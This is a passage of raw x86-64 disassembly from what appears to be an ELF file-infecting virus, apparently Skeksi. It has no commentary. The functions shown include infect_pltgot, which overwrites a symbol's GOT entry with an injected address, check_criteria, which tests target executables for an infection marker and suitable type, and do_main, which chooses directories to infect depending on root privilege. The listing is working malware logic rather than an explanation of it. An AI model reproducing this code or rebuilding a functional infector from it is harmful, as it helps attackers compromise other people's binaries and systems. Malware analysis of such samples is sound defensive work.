  4016a1:	48 8b 8d 50 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xb0]
  4016a8:	48 8b 9d 58 ff ff ff 	mov    rbx,QWORD PTR [rbp-0xa8]
  4016af:	48 89 48 68          	mov    QWORD PTR [rax+0x68],rcx
  4016b3:	48 89 58 70          	mov    QWORD PTR [rax+0x70],rbx
  4016b7:	48 8b 8d 60 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xa0]
  4016be:	48 8b 9d 68 ff ff ff 	mov    rbx,QWORD PTR [rbp-0x98]
  4016c5:	48 89 48 78          	mov    QWORD PTR [rax+0x78],rcx
  4016c9:	48 89 98 80 00 00 00 	mov    QWORD PTR [rax+0x80],rbx
  4016d0:	48 8b 8d 70 ff ff ff 	mov    rcx,QWORD PTR [rbp-0x90]
  4016d7:	48 8b 9d 78 ff ff ff 	mov    rbx,QWORD PTR [rbp-0x88]
  4016de:	48 89 88 88 00 00 00 	mov    QWORD PTR [rax+0x88],rcx
  4016e5:	48 89 98 90 00 00 00 	mov    QWORD PTR [rax+0x90],rbx
  4016ec:	48 8b 4d 80          	mov    rcx,QWORD PTR [rbp-0x80]
  4016f0:	48 8b 5d 88          	mov    rbx,QWORD PTR [rbp-0x78]
  4016f4:	48 89 88 98 00 00 00 	mov    QWORD PTR [rax+0x98],rcx
  4016fb:	48 89 98 a0 00 00 00 	mov    QWORD PTR [rax+0xa0],rbx
  401702:	48 8b 4d 90          	mov    rcx,QWORD PTR [rbp-0x70]
  401706:	48 8b 5d 98          	mov    rbx,QWORD PTR [rbp-0x68]
  40170a:	48 89 88 a8 00 00 00 	mov    QWORD PTR [rax+0xa8],rcx
  401711:	48 89 98 b0 00 00 00 	mov    QWORD PTR [rax+0xb0],rbx
  401718:	48 8b 4d a0          	mov    rcx,QWORD PTR [rbp-0x60]
  40171c:	48 8b 5d a8          	mov    rbx,QWORD PTR [rbp-0x58]
  401720:	48 89 88 b8 00 00 00 	mov    QWORD PTR [rax+0xb8],rcx
  401727:	48 89 98 c0 00 00 00 	mov    QWORD PTR [rax+0xc0],rbx
  40172e:	48 8b 4d b0          	mov    rcx,QWORD PTR [rbp-0x50]
  401732:	48 8b 5d b8          	mov    rbx,QWORD PTR [rbp-0x48]
  401736:	48 89 88 c8 00 00 00 	mov    QWORD PTR [rax+0xc8],rcx
  40173d:	48 89 98 d0 00 00 00 	mov    QWORD PTR [rax+0xd0],rbx
  401744:	48 8b 4d c0          	mov    rcx,QWORD PTR [rbp-0x40]
  401748:	48 8b 5d c8          	mov    rbx,QWORD PTR [rbp-0x38]
  40174c:	48 89 88 d8 00 00 00 	mov    QWORD PTR [rax+0xd8],rcx
  401753:	48 89 98 e0 00 00 00 	mov    QWORD PTR [rax+0xe0],rbx
  40175a:	48 8b 4d d0          	mov    rcx,QWORD PTR [rbp-0x30]
  40175e:	48 8b 5d d8          	mov    rbx,QWORD PTR [rbp-0x28]
  401762:	48 89 88 e8 00 00 00 	mov    QWORD PTR [rax+0xe8],rcx
  401769:	48 89 98 f0 00 00 00 	mov    QWORD PTR [rax+0xf0],rbx
  401770:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
  401774:	48 89 c2             	mov    rdx,rax
  401777:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40177e:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  401782:	b8 00 00 00 00       	mov    eax,0x0
  401787:	48 81 c4 b8 00 00 00 	add    rsp,0xb8
  40178e:	5b                   	pop    rbx
  40178f:	5d                   	pop    rbp
  401790:	c3                   	ret    

0000000000401791 <infect_pltgot>:
  401791:	f3 0f 1e fa          	endbr64 
  401795:	55                   	push   rbp
  401796:	48 89 e5             	mov    rbp,rsp
  401799:	48 83 ec 70          	sub    rsp,0x70
  40179d:	48 89 7d 98          	mov    QWORD PTR [rbp-0x68],rdi
  4017a1:	48 89 75 90          	mov    QWORD PTR [rbp-0x70],rsi
  4017a5:	c7 45 b4 00 00 00 00 	mov    DWORD PTR [rbp-0x4c],0x0
  4017ac:	c7 45 f8 ff ff ff ff 	mov    DWORD PTR [rbp-0x8],0xffffffff
  4017b3:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4017b7:	48 8b 40 18          	mov    rax,QWORD PTR [rax+0x18]
  4017bb:	48 89 45 a8          	mov    QWORD PTR [rbp-0x58],rax
  4017bf:	48 c7 45 c0 00 00 00 	mov    QWORD PTR [rbp-0x40],0x0
  4017c6:	00 
  4017c7:	48 c7 45 b8 00 00 00 	mov    QWORD PTR [rbp-0x48],0x0
  4017ce:	00 
  4017cf:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  4017d6:	e9 67 01 00 00       	jmp    401942 <infect_pltgot+0x1b1>
  4017db:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4017de:	48 98                	cdqe   
  4017e0:	48 c1 e0 04          	shl    rax,0x4
  4017e4:	48 89 c2             	mov    rdx,rax
  4017e7:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  4017eb:	48 01 d0             	add    rax,rdx
  4017ee:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4017f1:	48 83 f8 17          	cmp    rax,0x17
  4017f5:	0f 87 43 01 00 00    	ja     40193e <infect_pltgot+0x1ad>
  4017fb:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
  401802:	00 
  401803:	48 8d 05 c6 15 00 00 	lea    rax,[rip+0x15c6]        # 402dd0 <display_skeksi+0x9d>
  40180a:	8b 04 02             	mov    eax,DWORD PTR [rdx+rax*1]
  40180d:	48 98                	cdqe   
  40180f:	48 8d 15 ba 15 00 00 	lea    rdx,[rip+0x15ba]        # 402dd0 <display_skeksi+0x9d>
  401816:	48 01 d0             	add    rax,rdx
  401819:	3e ff e0             	notrack jmp rax
  40181c:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401820:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  401824:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401827:	48 98                	cdqe   
  401829:	48 c1 e0 04          	shl    rax,0x4
  40182d:	48 89 c1             	mov    rcx,rax
  401830:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401834:	48 01 c8             	add    rax,rcx
  401837:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40183b:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40183f:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  401843:	48 29 c1             	sub    rcx,rax
  401846:	48 89 c8             	mov    rax,rcx
  401849:	48 01 d0             	add    rax,rdx
  40184c:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  401850:	e9 e9 00 00 00       	jmp    40193e <infect_pltgot+0x1ad>
  401855:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401859:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  40185d:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401861:	48 8b 48 40          	mov    rcx,QWORD PTR [rax+0x40]
  401865:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401868:	48 98                	cdqe   
  40186a:	48 c1 e0 04          	shl    rax,0x4
  40186e:	48 89 c6             	mov    rsi,rax
  401871:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401875:	48 01 f0             	add    rax,rsi
  401878:	48 8b 70 08          	mov    rsi,QWORD PTR [rax+0x8]
  40187c:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401880:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  401884:	48 29 c6             	sub    rsi,rax
  401887:	48 89 f0             	mov    rax,rsi
  40188a:	48 01 c8             	add    rax,rcx
  40188d:	48 01 d0             	add    rax,rdx
  401890:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  401894:	e9 a5 00 00 00       	jmp    40193e <infect_pltgot+0x1ad>
  401899:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40189d:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4018a1:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4018a4:	48 98                	cdqe   
  4018a6:	48 c1 e0 04          	shl    rax,0x4
  4018aa:	48 89 c1             	mov    rcx,rax
  4018ad:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  4018b1:	48 01 c8             	add    rax,rcx
  4018b4:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4018b8:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4018bc:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  4018c0:	48 29 c1             	sub    rcx,rax
  4018c3:	48 89 c8             	mov    rax,rcx
  4018c6:	48 01 d0             	add    rax,rdx
  4018c9:	48 89 45 d8          	mov    QWORD PTR [rbp-0x28],rax
  4018cd:	eb 6f                	jmp    40193e <infect_pltgot+0x1ad>
  4018cf:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4018d2:	48 98                	cdqe   
  4018d4:	48 c1 e0 04          	shl    rax,0x4
  4018d8:	48 89 c2             	mov    rdx,rax
  4018db:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  4018df:	48 01 d0             	add    rax,rdx
  4018e2:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  4018e6:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  4018ea:	eb 52                	jmp    40193e <infect_pltgot+0x1ad>
  4018ec:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4018f0:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4018f4:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4018f7:	48 98                	cdqe   
  4018f9:	48 c1 e0 04          	shl    rax,0x4
  4018fd:	48 89 c1             	mov    rcx,rax
  401900:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401904:	48 01 c8             	add    rax,rcx
  401907:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40190b:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40190f:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  401913:	48 29 c1             	sub    rcx,rax
  401916:	48 89 c8             	mov    rax,rcx
  401919:	48 01 d0             	add    rax,rdx
  40191c:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  401920:	eb 1c                	jmp    40193e <infect_pltgot+0x1ad>
  401922:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401925:	48 98                	cdqe   
  401927:	48 c1 e0 04          	shl    rax,0x4
  40192b:	48 89 c2             	mov    rdx,rax
  40192e:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401932:	48 01 d0             	add    rax,rdx
  401935:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401939:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  40193d:	90                   	nop
  40193e:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401942:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401945:	48 98                	cdqe   
  401947:	48 c1 e0 04          	shl    rax,0x4
  40194b:	48 89 c2             	mov    rdx,rax
  40194e:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401952:	48 01 d0             	add    rax,rdx
  401955:	48 8b 00             	mov    rax,QWORD PTR [rax]
  401958:	48 85 c0             	test   rax,rax
  40195b:	0f 85 7a fe ff ff    	jne    4017db <infect_pltgot+0x4a>
  401961:	48 83 7d f0 00       	cmp    QWORD PTR [rbp-0x10],0x0
  401966:	74 07                	je     40196f <infect_pltgot+0x1de>
  401968:	48 83 7d e0 00       	cmp    QWORD PTR [rbp-0x20],0x0
  40196d:	75 0a                	jne    401979 <infect_pltgot+0x1e8>
  40196f:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401974:	e9 af 01 00 00       	jmp    401b28 <infect_pltgot+0x397>
  401979:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401980:	eb 47                	jmp    4019c9 <infect_pltgot+0x238>
  401982:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401985:	48 63 d0             	movsxd rdx,eax
  401988:	48 89 d0             	mov    rax,rdx
  40198b:	48 01 c0             	add    rax,rax
  40198e:	48 01 d0             	add    rax,rdx
  401991:	48 c1 e0 03          	shl    rax,0x3
  401995:	48 89 c2             	mov    rdx,rax
  401998:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  40199c:	48 01 d0             	add    rax,rdx
  40199f:	8b 00                	mov    eax,DWORD PTR [rax]
  4019a1:	89 c2                	mov    edx,eax
  4019a3:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4019a7:	48 01 d0             	add    rax,rdx
  4019aa:	48 8d 35 17 14 00 00 	lea    rsi,[rip+0x1417]        # 402dc8 <display_skeksi+0x95>
  4019b1:	48 89 c7             	mov    rdi,rax
  4019b4:	e8 85 12 00 00       	call   402c3e <_strcmp>
  4019b9:	85 c0                	test   eax,eax
  4019bb:	75 08                	jne    4019c5 <infect_pltgot+0x234>
  4019bd:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4019c0:	89 45 f8             	mov    DWORD PTR [rbp-0x8],eax
  4019c3:	eb 2b                	jmp    4019f0 <infect_pltgot+0x25f>
  4019c5:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  4019c9:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4019cc:	48 63 d0             	movsxd rdx,eax
  4019cf:	48 89 d0             	mov    rax,rdx
  4019d2:	48 01 c0             	add    rax,rax
  4019d5:	48 01 d0             	add    rax,rdx
  4019d8:	48 c1 e0 03          	shl    rax,0x3
  4019dc:	48 89 c2             	mov    rdx,rax
  4019df:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4019e3:	48 01 d0             	add    rax,rdx
  4019e6:	8b 00                	mov    eax,DWORD PTR [rax]
  4019e8:	89 c0                	mov    eax,eax
  4019ea:	48 39 45 d0          	cmp    QWORD PTR [rbp-0x30],rax
  4019ee:	73 92                	jae    401982 <infect_pltgot+0x1f1>
  4019f0:	83 7d f8 ff          	cmp    DWORD PTR [rbp-0x8],0xffffffff
  4019f4:	75 0a                	jne    401a00 <infect_pltgot+0x26f>
  4019f6:	b8 ff ff ff ff       	mov    eax,0xffffffff
  4019fb:	e9 28 01 00 00       	jmp    401b28 <infect_pltgot+0x397>
  401a00:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401a07:	e9 c4 00 00 00       	jmp    401ad0 <infect_pltgot+0x33f>
  401a0c:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401a0f:	48 63 d0             	movsxd rdx,eax
  401a12:	48 89 d0             	mov    rax,rdx
  401a15:	48 01 c0             	add    rax,rax
  401a18:	48 01 d0             	add    rax,rdx
  401a1b:	48 c1 e0 03          	shl    rax,0x3
  401a1f:	48 89 c2             	mov    rdx,rax
  401a22:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401a26:	48 01 d0             	add    rax,rdx
  401a29:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401a2d:	48 c1 e8 20          	shr    rax,0x20
  401a31:	48 89 c2             	mov    rdx,rax
  401a34:	48 89 d0             	mov    rax,rdx
  401a37:	48 01 c0             	add    rax,rax
  401a3a:	48 01 d0             	add    rax,rdx
  401a3d:	48 c1 e0 03          	shl    rax,0x3
  401a41:	48 89 c2             	mov    rdx,rax
  401a44:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  401a48:	48 01 d0             	add    rax,rdx
  401a4b:	8b 00                	mov    eax,DWORD PTR [rax]
  401a4d:	89 c2                	mov    edx,eax
  401a4f:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  401a53:	48 01 d0             	add    rax,rdx
  401a56:	48 8d 35 6b 13 00 00 	lea    rsi,[rip+0x136b]        # 402dc8 <display_skeksi+0x95>
  401a5d:	48 89 c7             	mov    rdi,rax
  401a60:	e8 d9 11 00 00       	call   402c3e <_strcmp>
  401a65:	85 c0                	test   eax,eax
  401a67:	75 63                	jne    401acc <infect_pltgot+0x33b>
  401a69:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401a6c:	48 63 d0             	movsxd rdx,eax
  401a6f:	48 89 d0             	mov    rax,rdx
  401a72:	48 01 c0             	add    rax,rax
  401a75:	48 01 d0             	add    rax,rdx
  401a78:	48 c1 e0 03          	shl    rax,0x3
  401a7c:	48 89 c2             	mov    rdx,rax
  401a7f:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401a83:	48 01 d0             	add    rax,rdx
  401a86:	48 8b 00             	mov    rax,QWORD PTR [rax]
  401a89:	48 89 45 c0          	mov    QWORD PTR [rbp-0x40],rax
  401a8d:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401a91:	48 8b 48 40          	mov    rcx,QWORD PTR [rax+0x40]
  401a95:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401a98:	48 63 d0             	movsxd rdx,eax
  401a9b:	48 89 d0             	mov    rax,rdx
  401a9e:	48 01 c0             	add    rax,rax
  401aa1:	48 01 d0             	add    rax,rdx
  401aa4:	48 c1 e0 03          	shl    rax,0x3
  401aa8:	48 89 c2             	mov    rdx,rax
  401aab:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401aaf:	48 01 d0             	add    rax,rdx
  401ab2:	48 8b 10             	mov    rdx,QWORD PTR [rax]
  401ab5:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401ab9:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  401abd:	48 29 c2             	sub    rdx,rax
  401ac0:	48 89 d0             	mov    rax,rdx
  401ac3:	48 01 c8             	add    rax,rcx
  401ac6:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  401aca:	eb 2b                	jmp    401af7 <infect_pltgot+0x366>
  401acc:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401ad0:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401ad3:	48 63 c8             	movsxd rcx,eax
  401ad6:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401ada:	48 ba ab aa aa aa aa 	movabs rdx,0xaaaaaaaaaaaaaaab
  401ae1:	aa aa aa 
  401ae4:	48 f7 e2             	mul    rdx
  401ae7:	48 89 d0             	mov    rax,rdx
  401aea:	48 c1 e8 04          	shr    rax,0x4
  401aee:	48 39 c1             	cmp    rcx,rax
  401af1:	0f 82 15 ff ff ff    	jb     401a0c <infect_pltgot+0x27b>
  401af7:	48 83 7d c0 00       	cmp    QWORD PTR [rbp-0x40],0x0
  401afc:	75 07                	jne    401b05 <infect_pltgot+0x374>
  401afe:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401b03:	eb 23                	jmp    401b28 <infect_pltgot+0x397>
  401b05:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401b09:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  401b0d:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  401b11:	48 01 d0             	add    rax,rdx
  401b14:	48 89 45 a0          	mov    QWORD PTR [rbp-0x60],rax
  401b18:	48 8b 45 a0          	mov    rax,QWORD PTR [rbp-0x60]
  401b1c:	48 8b 55 90          	mov    rdx,QWORD PTR [rbp-0x70]
  401b20:	48 89 10             	mov    QWORD PTR [rax],rdx
  401b23:	b8 00 00 00 00       	mov    eax,0x0
  401b28:	c9                   	leave  
  401b29:	c3                   	ret    

0000000000401b2a <check_criteria>:
  401b2a:	f3 0f 1e fa          	endbr64 
  401b2e:	55                   	push   rbp
  401b2f:	48 89 e5             	mov    rbp,rsp
  401b32:	48 81 ec 00 10 00 00 	sub    rsp,0x1000
  401b39:	48 83 0c 24 00       	or     QWORD PTR [rsp],0x0
  401b3e:	48 81 ec d0 00 00 00 	sub    rsp,0xd0
  401b45:	48 89 bd 38 ef ff ff 	mov    QWORD PTR [rbp-0x10c8],rdi
  401b4c:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [rbp-0xc],0x0
  401b53:	48 8b 85 38 ef ff ff 	mov    rax,QWORD PTR [rbp-0x10c8]
  401b5a:	ba 00 00 00 00       	mov    edx,0x0
  401b5f:	be 00 00 00 00       	mov    esi,0x0
  401b64:	48 89 c7             	mov    rdi,rax
  401b67:	e8 0a 05 00 00       	call   402076 <_open>
  401b6c:	89 45 f0             	mov    DWORD PTR [rbp-0x10],eax
  401b6f:	83 7d f0 00          	cmp    DWORD PTR [rbp-0x10],0x0
  401b73:	79 0a                	jns    401b7f <check_criteria+0x55>
  401b75:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401b7a:	e9 27 01 00 00       	jmp    401ca6 <check_criteria+0x17c>
  401b7f:	8b 45 f0             	mov    eax,DWORD PTR [rbp-0x10]
  401b82:	48 98                	cdqe   
  401b84:	48 8d 8d 40 ef ff ff 	lea    rcx,[rbp-0x10c0]
  401b8b:	ba 00 10 00 00       	mov    edx,0x1000
  401b90:	48 89 ce             	mov    rsi,rcx
  401b93:	48 89 c7             	mov    rdi,rax
  401b96:	e8 2f 05 00 00       	call   4020ca <_read>
  401b9b:	85 c0                	test   eax,eax
  401b9d:	79 0a                	jns    401ba9 <check_criteria+0x7f>
  401b9f:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401ba4:	e9 fd 00 00 00       	jmp    401ca6 <check_criteria+0x17c>
  401ba9:	8b 45 f0             	mov    eax,DWORD PTR [rbp-0x10]
  401bac:	89 c7                	mov    edi,eax
  401bae:	e8 f9 04 00 00       	call   4020ac <_close>
  401bb3:	48 8d 85 40 ef ff ff 	lea    rax,[rbp-0x10c0]
  401bba:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  401bbe:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401bc2:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  401bc6:	48 8d 95 40 ef ff ff 	lea    rdx,[rbp-0x10c0]
  401bcd:	48 01 d0             	add    rax,rdx
  401bd0:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  401bd4:	48 8d 85 40 ef ff ff 	lea    rax,[rbp-0x10c0]
  401bdb:	ba 04 00 00 00       	mov    edx,0x4
  401be0:	48 89 c6             	mov    rsi,rax
  401be3:	48 8d 3d 46 12 00 00 	lea    rdi,[rip+0x1246]        # 402e30 <display_skeksi+0xfd>
  401bea:	e8 af 10 00 00       	call   402c9e <_memcmp>
  401bef:	85 c0                	test   eax,eax
  401bf1:	74 0a                	je     401bfd <check_criteria+0xd3>
  401bf3:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401bf8:	e9 a9 00 00 00       	jmp    401ca6 <check_criteria+0x17c>
  401bfd:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401c01:	48 83 c0 09          	add    rax,0x9
  401c05:	8b 00                	mov    eax,DWORD PTR [rax]
  401c07:	89 45 dc             	mov    DWORD PTR [rbp-0x24],eax
  401c0a:	81 7d dc 25 5d 01 00 	cmp    DWORD PTR [rbp-0x24],0x15d25
  401c11:	75 0a                	jne    401c1d <check_criteria+0xf3>
  401c13:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401c18:	e9 89 00 00 00       	jmp    401ca6 <check_criteria+0x17c>
  401c1d:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401c21:	0f b7 40 10          	movzx  eax,WORD PTR [rax+0x10]
  401c25:	66 83 f8 02          	cmp    ax,0x2
  401c29:	74 07                	je     401c32 <check_criteria+0x108>
  401c2b:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401c30:	eb 74                	jmp    401ca6 <check_criteria+0x17c>
  401c32:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401c36:	0f b7 40 12          	movzx  eax,WORD PTR [rax+0x12]
  401c3a:	66 83 f8 3e          	cmp    ax,0x3e
  401c3e:	74 07                	je     401c47 <check_criteria+0x11d>
  401c40:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401c45:	eb 5f                	jmp    401ca6 <check_criteria+0x17c>
  401c47:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401c4e:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  401c55:	eb 2d                	jmp    401c84 <check_criteria+0x15a>
  401c57:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  401c5a:	48 63 d0             	movsxd rdx,eax
  401c5d:	48 89 d0             	mov    rax,rdx
  401c60:	48 c1 e0 03          	shl    rax,0x3
  401c64:	48 29 d0             	sub    rax,rdx
  401c67:	48 c1 e0 03          	shl    rax,0x3
  401c6b:	48 89 c2             	mov    rdx,rax
  401c6e:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  401c72:	48 01 d0             	add    rax,rdx
  401c75:	8b 00                	mov    eax,DWORD PTR [rax]
  401c77:	83 f8 02             	cmp    eax,0x2
  401c7a:	75 04                	jne    401c80 <check_criteria+0x156>
  401c7c:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401c80:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  401c84:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401c88:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  401c8c:	0f b7 c0             	movzx  eax,ax
  401c8f:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  401c92:	7c c3                	jl     401c57 <check_criteria+0x12d>
  401c94:	83 7d fc 00          	cmp    DWORD PTR [rbp-0x4],0x0
  401c98:	75 07                	jne    401ca1 <check_criteria+0x177>
  401c9a:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401c9f:	eb 05                	jmp    401ca6 <check_criteria+0x17c>
  401ca1:	b8 00 00 00 00       	mov    eax,0x0
  401ca6:	c9                   	leave  
  401ca7:	c3                   	ret    

0000000000401ca8 <do_main>:
  401ca8:	f3 0f 1e fa          	endbr64 
  401cac:	55                   	push   rbp
  401cad:	48 89 e5             	mov    rbp,rsp
  401cb0:	4c 8d 9c 24 00 80 ff 	lea    r11,[rsp-0x8000]
  401cb7:	ff 
  401cb8:	48 81 ec 00 10 00 00 	sub    rsp,0x1000
  401cbf:	48 83 0c 24 00       	or     QWORD PTR [rsp],0x0
  401cc4:	4c 39 dc             	cmp    rsp,r11
  401cc7:	75 ef                	jne    401cb8 <do_main+0x10>
  401cc9:	48 81 ec 60 03 00 00 	sub    rsp,0x360
  401cd0:	48 89 bd a8 7c ff ff 	mov    QWORD PTR [rbp-0x8358],rdi
  401cd7:	48 c7 45 90 00 00 00 	mov    QWORD PTR [rbp-0x70],0x0
  401cde:	00 
  401cdf:	48 c7 45 e8 00 00 00 	mov    QWORD PTR [rbp-0x18],0x0
  401ce6:	00 
  401ce7:	c7 45 f8 04 00 00 00 	mov    DWORD PTR [rbp-0x8],0x4
  401cee:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [rbp-0xc],0x0
  401cf5:	48 8d 05 39 11 00 00 	lea    rax,[rip+0x1139]        # 402e35 <display_skeksi+0x102>
  401cfc:	48 89 85 e0 7c ff ff 	mov    QWORD PTR [rbp-0x8320],rax
  401d03:	48 8d 05 31 11 00 00 	lea    rax,[rip+0x1131]        # 402e3b <display_skeksi+0x108>
  401d0a:	48 89 85 e8 7c ff ff 	mov    QWORD PTR [rbp-0x8318],rax
  401d11:	48 8d 05 2d 11 00 00 	lea    rax,[rip+0x112d]        # 402e45 <display_skeksi+0x112>
  401d18:	48 89 85 f0 7c ff ff 	mov    QWORD PTR [rbp-0x8310],rax
  401d1f:	48 8d 05 24 11 00 00 	lea    rax,[rip+0x1124]        # 402e4a <display_skeksi+0x117>
  401d26:	48 89 85 f8 7c ff ff 	mov    QWORD PTR [rbp-0x8308],rax
  401d2d:	66 c7 85 de 7c ff ff 	mov    WORD PTR [rbp-0x8322],0x2e
  401d34:	2e 00 
  401d36:	b8 00 00 00 00       	mov    eax,0x0
  401d3b:	e8 f9 02 00 00       	call   402039 <_getuid>
  401d40:	85 c0                	test   eax,eax
  401d42:	74 09                	je     401d4d <do_main+0xa5>
  401d44:	48 8d 85 de 7c ff ff 	lea    rax,[rbp-0x8322]
  401d4b:	eb 0f                	jmp    401d5c <do_main+0xb4>
  401d4d:	48 8d 85 e0 7c ff ff 	lea    rax,[rbp-0x8320]
  401d54:	48 89 c7             	mov    rdi,rax
  401d57:	e8 00 e7 ff ff       	call   40045c <randomly_select_dir>
  401d5c:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  401d60:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401d64:	48 8d 35 e8 10 00 00 	lea    rsi,[rip+0x10e8]        # 402e53 <display_skeksi+0x120>
  401d6b:	48 89 c7             	mov    rdi,rax
  401d6e:	e8 cb 0e 00 00       	call   402c3e <_strcmp>
  401d73:	85 c0                	test   eax,eax
  401d75:	75 07                	jne    401d7e <do_main+0xd6>
  401d77:	c7 45 f8 01 00 00 00 	mov    DWORD PTR [rbp-0x8],0x1
  401d7e:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
